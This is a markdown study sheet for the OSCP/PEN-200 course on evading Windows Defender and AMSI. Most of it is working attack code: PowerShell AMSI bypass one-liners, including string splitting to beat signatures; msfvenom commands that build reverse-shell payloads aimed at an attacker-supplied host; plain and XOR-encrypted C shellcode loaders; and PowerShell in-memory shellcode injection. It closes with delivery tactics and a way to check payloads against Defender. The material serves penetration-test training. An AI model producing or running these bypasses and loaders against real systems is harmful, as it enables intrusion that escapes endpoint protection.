# Antivirus Evasion Basics (PEN-200 Module 12)

> **Scope:** Techniques for getting payloads past Windows Defender and AMSI in OSCP-lab scenarios. The exam uses default Defender with real-time protection on some targets — payloads that work in HTB/PG may get caught. This file covers the manual approaches PEN-200 teaches; automated frameworks (Veil, ScareCrow, Nimcrypt2) are referenced but not relied on.
>
> See also: [`notes/client-side-attacks.md`](client-side-attacks.md) for payload delivery.

---

## 1. Understanding Detection

**Signature-based (static):** AV scans the file on disk for known byte patterns. Defeated by changing the payload's byte signature (encoding, encryption, custom compilation).

**Heuristic/behavioral:** AV monitors runtime behavior (API call sequences, memory patterns). Harder to evade — requires changing *what* the payload does, not just how it looks on disk.

**AMSI (Antimalware Scan Interface):** Hooks into PowerShell, .NET, VBScript, JScript at runtime. Scans script content *in memory* before execution — affects fileless attacks (download-cradles, `IEX`, `Invoke-Expression`). Does NOT scan compiled EXEs or raw shellcode injected via Win32 API.

---

## 2. AMSI Bypass Techniques

**One-liner bypass (PowerShell — patch `AmsiScanBuffer` in memory):**
```powershell
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)
```
This sets the `amsiInitFailed` flag to `true`, causing all subsequent AMSI scans in that session to return clean. Run it *before* loading any tool (Rubeus, PowerView, etc.).

**If the one-liner itself is caught** (Defender signatures the string `AmsiUtils`):
```powershell
# String concatenation to avoid signature
$a=[Ref].Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils')
```

**Reflection-based bypass (longer but more robust):**
```powershell
$mem = [System.Runtime.InteropServices.Marshal]
$ptr = $mem::GetDelegateForFunctionPointer(
    ($mem::LoadLibrary("amsi.dll") | ForEach-Object { $mem::GetProcAddress($_, "AmsiScanBuffer") }),
    [Func[IntPtr, UInt32, IntPtr, UInt32, [Ref]UInt32, Int32]]
)
# Patch the function to return AMSI_RESULT_CLEAN
```

**Bypass verification:** after running the bypass, test with `'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'` — if AMSI is active, this string triggers a detection. If bypassed, it prints cleanly.

---

## 3. Payload Obfuscation for Static Evasion

### 3.1 msfvenom Encoders and Encryption

Encoders alone (`shikata_ga_nai`) are **no longer sufficient** against modern Defender — AV vendors have signatures for the decoder stub itself.

```bash
# Basic encoding (often caught)
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=443 -e x86/shikata_ga_nai -i 5 -f exe -o shell.exe

# Encryption (better — AES-encrypts the shellcode, decrypts at runtime)
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=443 --encrypt aes256 --encrypt-key secretkey123456 -f exe -o encrypted.exe
```

### 3.2 Custom Shellcode Runner (C — most reliable static evasion)

Generate raw shellcode, then compile your own loader. AV doesn't recognize the custom binary.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=443 -f c -o shellcode.c
```

**Minimal C loader (compile with `x86_64-w64-mingw32-gcc`):**
```c
#include <windows.h>
#include <stdio.h>

unsigned char buf[] = 
"\xfc\xe8\x82\x00\x00\x00...";  // paste msfvenom output here

int main() {
    void *exec = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buf, sizeof(buf));
    ((void(*)())exec)();
    return 0;
}
```

```bash
x86_64-w64-mingw32-gcc loader.c -o loader.exe -lws2_32
```

### 3.3 XOR-Encrypted Shellcode Runner

XOR the shellcode at build time, decrypt at runtime — changes the static signature completely.

**Python helper to XOR-encode:**
```python
import sys
key = 0x42
with open(sys.argv[1], 'rb') as f:
    shellcode = f.read()
encoded = ','.join(f'0x{b ^ key:02x}' for b in shellcode)
print(f'unsigned char buf[] = {{{encoded}}};')
print(f'// XOR key: 0x{key:02x}, length: {len(shellcode)}')
```

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=443 -f raw -o payload.bin
python3 xor_encode.py payload.bin
```

**C loader with XOR decrypt:**
```c
#include <windows.h>

unsigned char buf[] = { /* XOR-encoded bytes */ };
int buflen = sizeof(buf);

int main() {
    for (int i = 0; i < buflen; i++) buf[i] ^= 0x42;  // runtime decrypt
    void *exec = VirtualAlloc(NULL, buflen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buf, buflen);
    ((void(*)())exec)();
    return 0;
}
```

### 3.4 PowerShell-Based Shellcode Injection

```powershell
$buf = [byte[]](0xfc,0xe8,...)  # shellcode bytes
$size = $buf.Length

[IntPtr]$addr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Add-Type -MemberDefinition '[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);' -Name 'Win32' -PassThru)::VirtualAlloc(0, $size, 0x3000, 0x40),
    [Action]
)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
$thread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Add-Type -MemberDefinition '[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);' -Name 'Win32b' -PassThru)::CreateThread(0, 0, $addr, 0, 0, 0),
    [Action]
)
```
Run the AMSI bypass (§2) first, then this. Requires an unrestricted execution policy or `-ep bypass`.

---

## 4. Transfer and Execution Strategies

| Scenario | Approach |
|----------|----------|
| Defender active, PowerShell available | AMSI bypass → in-memory shellcode injection (§3.4) |
| Defender active, need EXE on disk | Custom-compiled C loader with XOR (§3.3) |
| Defender active, constrained language mode | Drop a compiled EXE via `certutil`/SMB — CLM blocks PowerShell tricks but not native binaries |
| No AV / lab environment | Standard msfvenom EXE or PowerShell cradle works fine |

**Testing locally before delivery:**
```bash
# Check a file against Windows Defender's static scanner (from a Windows VM)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File C:\path\to\payload.exe
```

---

## 5. Automated Frameworks (Reference Only)

| Tool | Purpose | Link |
|------|---------|------|
| ScareCrow | Shellcode loader with EDR evasion (DLL sideloading) | https://github.com/optiv/ScareCrow |
| Nimcrypt2 | Nim-based packer/encryptor | https://github.com/icyguider/Nimcrypt2 |
| Veil | Multi-language payload generation framework | https://github.com/Veil-Framework/Veil |

These are useful for labs/HTB but may not be available on the exam. The manual techniques above (§2-3) work without any extra tooling beyond `msfvenom` and `mingw`.
